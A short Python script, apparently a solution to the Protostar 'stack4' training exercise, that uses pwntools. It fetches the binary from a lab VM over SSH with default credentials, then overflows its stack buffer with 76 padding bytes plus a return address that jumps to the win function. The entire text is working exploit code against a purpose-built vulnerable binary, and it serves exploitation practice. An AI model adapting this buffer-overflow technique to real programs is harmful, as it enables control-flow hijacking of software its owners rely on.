import os, sys, subprocess
from pwn import *

context(arch='i686', os='linux')

shell = ssh(host='192.168.94.129', user='user', password='user', port=22)
shell.download_file('/opt/protostar/bin/stack4')
if not os.access('./stack4', os.X_OK):
    subprocess.call('chmod +x ./stack4', shell=True)

junk = 'A'*cyclic_find(0x61616174) # 76
win_fnc = p32(0x080483f4, endian='little')

p = process('./stack4')
p.sendline(junk+win_fnc)
log.info(p.recv())
